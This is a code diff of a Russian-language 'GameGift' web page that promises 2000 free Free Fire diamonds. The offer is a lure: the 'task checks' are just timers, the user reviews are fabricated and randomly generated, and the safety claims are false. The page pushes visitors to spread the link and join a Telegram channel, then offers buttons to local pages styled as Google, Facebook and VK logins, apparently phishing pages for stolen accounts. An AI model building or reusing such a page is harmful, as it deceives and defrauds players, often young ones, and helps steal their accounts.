@@ -3,362 +3,206 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>GameGift - Бесплатные алмазы</title>
+    <title>GameGift Live</title>
     <style>
-        body {
+        body, html {
             margin: 0;
             padding: 0;
-            height: 100vh;
-            background: url('video.mp4') no-repeat center center fixed;
-            background-size: cover;
-            color: rgba(255, 255, 255, 0.8);
+            height: 100%;
+            color: white;
             font-family: 'Arial', sans-serif;
-            overflow-y: auto;
-            position: relative;
+            overflow-x: hidden;
         }
-        .overlay {
-            position: absolute;
+        .background-video {
+            position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0, 0, 0, 0.5);
-        }
-        .content {
-            position: relative;
-            padding: 20px;
-            text-align: center;
-        }
-        .title {
-            font-size: 3em;
-            color: black;
-            margin: 30px 0;
-        }
-        .task {
-            margin: 20px 0;
-            padding: 15px;
-            background-color: rgba(0, 0, 0, 0.6);
-            border-radius: 10px;
-        }
-        .task button {
-            margin-top: 10px;
-            padding: 10px 20px;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            background-color: #007BFF;
-            color: white;
-            transition: background-color 0.3s;
-        }
-        .task button:disabled {
-            background-color: #555;
-        }
-        .social-share {
-            margin: 20px 0;
-        }
-        .comments {
-            margin-top: 30px;
-            padding: 20px;
-            background-color: rgba(0, 0, 0, 0.5);
-            border-radius: 10px;
-            text-align: left;
-        }
-        .comment {
-            margin: 10px 0;
-            padding: 10px;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.2);
-        }
-        .input-comment {
-            margin-top: 20px;
-        }
-        .input-comment input {
-            width: 80%;
-            padding: 10px;
-            margin-right: 10px;
-        }
-        .footer {
-            margin-top: 40px;
-            text-align: center;
-        }
-    </style>
-</head>
-<body>
-    <div class="overlay"></div>
-    <div class="content">
-        <div class="title">Сделай задание и выиграй 2000 алмазов!</div>
-        <div class="task">
-            <p>1. Подпишись на наш <a href="https://ify.ac/1YsR" target="_blank">Telegram-канал</a></p>
-            <button id="task1">Проверить</button>
-        </div>
-        <div class="task">
-            <p>2. Поделись ссылкой на сайт с друзьями</p>
-            <button id="shareBtn">Поделиться</button>
-            <p id="shareStatus"></p>
-        </div>
-        <div class="footer">
-            <button id="proceedBtn" style="display:none;">Войти и забрать алмазы</button>
-        </div>
-        <div class="comments">
-            <h3>Комментарии</h3>
-            <div id="commentList"></div>
-            <div class="input-comment">
-                <input type="text" id="userComment" placeholder="Оставить комментарий">
-                <button onclick="addComment()">Отправить</button>
-            </div>
-        </div>
-        <div class="about">
-            <h3>О нас</h3>
-            <p id="aboutText"></p>
-        </div>
-    </div>
-    <script>
-        const comments = [
-            "Спасибо, получил алмазы!", "Сайт работает, всем советую!", "Не верил, но это реально!", "Круто, мои друзья уже тоже здесь!",
-            "Все быстро и без проблем!", "Получил алмазы для Free Fire, спасибо!", "Лучший сайт, что я видел!", "Вау, это работает!",
-            "Теперь могу купить скины!", "Мои друзья тоже подписались!", "Отличный сервис, рекомендую!", "Не обман, реально работает!",
-            "Спасибо огромное!", "Сомневался, но теперь доволен!", "Получил 2000 алмазов!", "Все честно и быстро!"
-        ];
-        const aboutText = `Мы предоставляем алмазы для Free Fire уже более 2 лет. Наш сервис работает стабильно и безопасно, и мы уже помогли более 10 000 игрокам получить свои награды. Мы ценим наших пользователей и делаем все возможное, чтобы ваш опыт был приятным. Подписывайтесь на наш Telegram-канал и приглашайте друзей, чтобы получать еще больше бонусов. Мы гарантируем безопасность и надежность наших услуг. Наши партнеры - ведущие игровые сообщества, а наша команда всегда готова помочь. Мы стремимся к качеству и удобству, чтобы каждый пользователь остался доволен.`.repeat(5);
-
-        document.getElementById('aboutText').innerText = aboutText;
-
-        function shuffleComments() {
-            const shuffled = comments.sort(() => 0.5 - Math.random()).slice(0, 7);
-            const commentList = document.getElementById('commentList');
-            commentList.innerHTML = '';
-            shuffled.forEach(c => {
-                const div = document.createElement('div');
-                div.className = 'comment';
-                div.textContent = c;
-                commentList.appendChild(div);
-            });
-        }
-        shuffleComments();
-
-        function addComment() {
-            const input = document.getElementById('userComment');
-            const comment = input.value.trim();
-            if (comment) {
-                comments.push(comment);
-                shuffleComments();
-                input.value = '';
-            }
-        }
-
-        document.getElementById('task1').addEventListener('click', () => {
-            setTimeout(() => {
-                document.getElementById('task1').textContent = 'Готово';
-                document.getElementById('task1').disabled = true;
-            }, 10000);
-        });
-
-        document.getElementById('shareBtn').addEventListener('click', () => {
-            navigator.share({
-                title: 'GameGift',
-                text: 'Зайди на сайт и получи 2000 алмазов! https://gamegift.live/',
-                url: 'https://gamegift.live/'
-            }).then(() => {
-                document.getElementById('shareStatus').innerText = 'Ссылка отправлена!';
-                setTimeout(() => {
-                    document.getElementById('shareBtn').textContent = 'Готово';
-                    document.getElementById('shareBtn').disabled = true;
-                }, 10000);
-            }).catch(console.error);
-        });
-
-        setInterval(() => {
-            const task1 = document.getElementById('task1').disabled;
-            const task2 = document.getElementById('shareBtn').disabled;
-            if (task1 && task2) {
-                document.getElementById('proceedBtn').style.display = 'block';
-            }
-        }, 1000);
-
-        document.getElementById('proceedBtn').addEventListener('click', () => {
-            window.location.href = '/login';
-        });
-    </script>
-</body>
-</html>
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>GameGift - Бесплатные алмазы</title>
-    <style>
-        body {
-            margin: 0;
-            padding: 0;
-            height: 100vh;
-            background: url('video.mp4') no-repeat center center fixed;
-            background-size: cover;
-            color: rgba(255, 255, 255, 0.8);
-            font-family: 'Arial', sans-serif;
-            overflow-y: auto;
-            position: relative;
+            object-fit: cover;
+            z-index: -1;
         }
         .overlay {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.5);
-        }
-        .content {
             position: relative;
-            padding: 20px;
+            min-height: 100vh;
+            background: rgba(0, 0, 0, 0.5);
+            padding: 50px 20px;
             text-align: center;
         }
-        .title {
+        .main-text {
             font-size: 3em;
             color: black;
-            margin: 30px 0;
+            background-color: rgba(255, 255, 255, 0.6);
+            padding: 30px;
+            margin-bottom: 40px;
+            border-radius: 15px;
         }
-        .task {
-            margin: 20px 0;
-            padding: 15px;
-            background-color: rgba(0, 0, 0, 0.6);
-            border-radius: 10px;
+        .tasks {
+            margin-bottom: 40px;
         }
-        .task button {
-            margin-top: 10px;
-            padding: 10px 20px;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            background-color: #007BFF;
+        .task-button {
+            display: block;
+            margin: 20px auto;
+            padding: 20px;
+            width: 80%;
+            background: #007BFF;
             color: white;
-            transition: background-color 0.3s;
+            border: none;
+            border-radius: 10px;
+            font-size: 1.5em;
+            cursor: pointer;
+            transition: background 0.3s;
         }
-        .task button:disabled {
-            background-color: #555;
+        .task-button.completed {
+            background: green;
         }
-        .social-share {
-            margin: 20px 0;
+        .login-buttons {
+            display: none;
+            margin-top: 40px;
+        }
+        .login-button {
+            margin: 10px;
+            padding: 20px;
+            background: #333;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 1.5em;
+            cursor: pointer;
+        }
+        .about {
+            margin-top: 60px;
+            opacity: 0.5;
+            text-align: left;
+            padding: 20px;
+            background-color: rgba(0, 0, 0, 0.7);
+            border-radius: 15px;
         }
         .comments {
-            margin-top: 30px;
+            margin-top: 40px;
             padding: 20px;
-            background-color: rgba(0, 0, 0, 0.5);
-            border-radius: 10px;
-            text-align: left;
+            background: rgba(0, 0, 0, 0.6);
+            border-radius: 15px;
         }
         .comment {
             margin: 10px 0;
             padding: 10px;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.2);
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
         }
-        .input-comment {
-            margin-top: 20px;
+        .comment img {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            margin-right: 15px;
         }
-        .input-comment input {
-            width: 80%;
-            padding: 10px;
-            margin-right: 10px;
-        }
-        .footer {
-            margin-top: 40px;
-            text-align: center;
+        .comment .text {
+            flex: 1;
         }
     </style>
 </head>
 <body>
-    <div class="overlay"></div>
-    <div class="content">
-        <div class="title">Сделай задание и выиграй 2000 алмазов!</div>
-        <div class="task">
-            <p>1. Подпишись на наш <a href="https://ify.ac/1YsR" target="_blank">Telegram-канал</a></p>
-            <button id="task1">Проверить</button>
+    <video class="background-video" autoplay muted loop>
+        <source src="video.mp4" type="video/mp4">
+    </video>
+    <div class="overlay">
+        <div class="main-text">Сделай задания и выиграй 2000 алмазов!</div>
+        
+        <div class="tasks">
+            <button class="task-button" id="task1" onclick="completeTask('task1')">Посетить Telegram-канал</button>
+            <button class="task-button" id="task2" onclick="shareWithFriends()">Поделиться с друзьями</button>
         </div>
-        <div class="task">
-            <p>2. Поделись ссылкой на сайт с друзьями</p>
-            <button id="shareBtn">Поделиться</button>
-            <p id="shareStatus"></p>
+
+        <div class="login-buttons" id="loginButtons">
+            <button class="login-button" onclick="window.location.href='login.google.html'">Войти через Google</button>
+            <button class="login-button" onclick="window.location.href='login.facebook.html'">Войти через Facebook</button>
+            <button class="login-button" onclick="window.location.href='login.vk.html'">Войти через ВК</button>
         </div>
-        <div class="footer">
-            <button id="proceedBtn" style="display:none;">Войти и забрать алмазы</button>
-        </div>
-        <div class="comments">
-            <h3>Комментарии</h3>
-            <div id="commentList"></div>
-            <div class="input-comment">
-                <input type="text" id="userComment" placeholder="Оставить комментарий">
-                <button onclick="addComment()">Отправить</button>
-            </div>
-        </div>
+
         <div class="about">
-            <h3>О нас</h3>
-            <p id="aboutText"></p>
+            <h3>О нашем сервисе</h3>
+            <p>
+                Мы работаем уже 2 года, предоставляя игрокам возможность получать бесплатные алмазы за выполнение простых заданий. 
+                За это время более 10 000 пользователей получили свои награды. Наша платформа обеспечивает безопасность и анонимность, 
+                так как мы никогда не запрашиваем лишние данные и не передаем информацию третьим лицам. Наши партнёры – ведущие 
+                разработчики мобильных игр, которые помогают нам поддерживать проект. Просто выполните задания, поделитесь с друзьями 
+                и получите свои алмазы. 
+                Мы ценим ваше доверие и гарантируем честность в работе. Попробуйте – и вы убедитесь сами!
+            </p>
+        </div>
+
+        <div class="comments" id="comments">
+            <h4>Отзывы пользователей</h4>
         </div>
     </div>
+
     <script>
-        const comments = [
-            "Спасибо, получил алмазы!", "Сайт работает, всем советую!", "Не верил, но это реально!", "Круто, мои друзья уже тоже здесь!",
-            "Все быстро и без проблем!", "Получил алмазы для Free Fire, спасибо!", "Лучший сайт, что я видел!", "Вау, это работает!",
-            "Теперь могу купить скины!", "Мои друзья тоже подписались!", "Отличный сервис, рекомендую!", "Не обман, реально работает!",
-            "Спасибо огромное!", "Сомневался, но теперь доволен!", "Получил 2000 алмазов!", "Все честно и быстро!"
-        ];
-        const aboutText = `Мы предоставляем алмазы для Free Fire уже более 2 лет. Наш сервис работает стабильно и безопасно, и мы уже помогли более 10 000 игрокам получить свои награды. Мы ценим наших пользователей и делаем все возможное, чтобы ваш опыт был приятным. Подписывайтесь на наш Telegram-канал и приглашайте друзей, чтобы получать еще больше бонусов. Мы гарантируем безопасность и надежность наших услуг. Наши партнеры - ведущие игровые сообщества, а наша команда всегда готова помочь. Мы стремимся к качеству и удобству, чтобы каждый пользователь остался доволен.`.repeat(5);
+        let tasksCompleted = 0;
 
-        document.getElementById('aboutText').innerText = aboutText;
-
-        function shuffleComments() {
-            const shuffled = comments.sort(() => 0.5 - Math.random()).slice(0, 7);
-            const commentList = document.getElementById('commentList');
-            commentList.innerHTML = '';
-            shuffled.forEach(c => {
-                const div = document.createElement('div');
-                div.className = 'comment';
-                div.textContent = c;
-                commentList.appendChild(div);
-            });
-        }
-        shuffleComments();
-
-        function addComment() {
-            const input = document.getElementById('userComment');
-            const comment = input.value.trim();
-            if (comment) {
-                comments.push(comment);
-                shuffleComments();
-                input.value = '';
-            }
-        }
-
-        document.getElementById('task1').addEventListener('click', () => {
+        function completeTask(id) {
+            const button = document.getElementById(id);
+            button.disabled = true;
             setTimeout(() => {
-                document.getElementById('task1').textContent = 'Готово';
-                document.getElementById('task1').disabled = true;
+                button.classList.add('completed');
+                tasksCompleted++;
+                checkTasks();
             }, 10000);
-        });
+            window.open('https://ify.ac/1YsR', '_blank');
+        }
 
-        document.getElementById('shareBtn').addEventListener('click', () => {
-            navigator.share({
-                title: 'GameGift',
-                text: 'Зайди на сайт и получи 2000 алмазов! https://gamegift.live/',
-                url: 'https://gamegift.live/'
-            }).then(() => {
-                document.getElementById('shareStatus').innerText = 'Ссылка отправлена!';
-                setTimeout(() => {
-                    document.getElementById('shareBtn').textContent = 'Готово';
-                    document.getElementById('shareBtn').disabled = true;
-                }, 10000);
-            }).catch(console.error);
-        });
+        function shareWithFriends() {
+            const text = encodeURIComponent('Привет! 🎉 Я уже получил свои 2000 алмазов за простые задания. Попробуй и ты! 👉 https://gamegift.live/');
+            const telegramUrl = `https://t.me/share/url?url=${text}`;
+            window.open(telegramUrl, '_blank');
+            setTimeout(() => {
+                document.getElementById('task2').classList.add('completed');
+                tasksCompleted++;
+                checkTasks();
+            }, 10000);
+        }
 
-        setInterval(() => {
-            const task1 = document.getElementById('task1').disabled;
-            const task2 = document.getElementById('shareBtn').disabled;
-            if (task1 && task2) {
-                document.getElementById('proceedBtn').style.display = 'block';
+        function checkTasks() {
+            if (tasksCompleted === 2) {
+                document.getElementById('loginButtons').style.display = 'block';
             }
-        }, 1000);
+        }
 
-        document.getElementById('proceedBtn').addEventListener('click', () => {
-            window.location.href = '/login';
-        });
+        function generateComments() {
+            const commentsContainer = document.getElementById('comments');
+            const names = ['Иван', 'Мария', 'Петр', 'Алина', 'Сергей', 'Оксана', 'Дмитрий', 'Ксения', 'Артем', 'Екатерина'];
+            const avatars = [
+                'https://via.placeholder.com/50?text=U1',
+                'https://via.placeholder.com/50?text=U2',
+                'https://via.placeholder.com/50?text=U3',
+                'https://via.placeholder.com/50?text=U4'
+            ];
+            const comments = [
+                'Отличный сервис! Всё честно, алмазы пришли быстро!',
+                'Не ожидал, что так легко можно получить алмазы. Спасибо!',
+                'Рекомендую! Всё работает, проверено лично.',
+                'Сомневался, но зря. Всё супер!',
+                'Очень доволен. Теперь всегда пользуюсь этим сервисом!',
+                'Быстро, просто и бесплатно – что ещё нужно?',
+                'Поделился с друзьями – они тоже в восторге!',
+                'Понравилась система заданий. Всё понятно.',
+                'Теперь могу радовать себя и друзей подарками в игре!',
+                'Спасибо разработчикам! Всё на высшем уровне.'
+            ];
+
+            for (let i = 0; i < 5; i++) {
+                const randomName = names[Math.floor(Math.random() * names.length)];
+                const randomAvatar = avatars[Math.floor(Math.random() * avatars.length)];
+                const randomComment = comments[Math.floor(Math.random() * comments.length)];
+                const commentEl = document.createElement('div');
+                commentEl.className = 'comment';
+                commentEl.innerHTML = `<img src="${randomAvatar}" alt="avatar"><div class="text"><strong>${randomName}</strong>: ${randomComment}</div>`;
+                commentsContainer.appendChild(commentEl);
+            }
+        }
+
+        generateComments();
     </script>
 </body>
 </html>
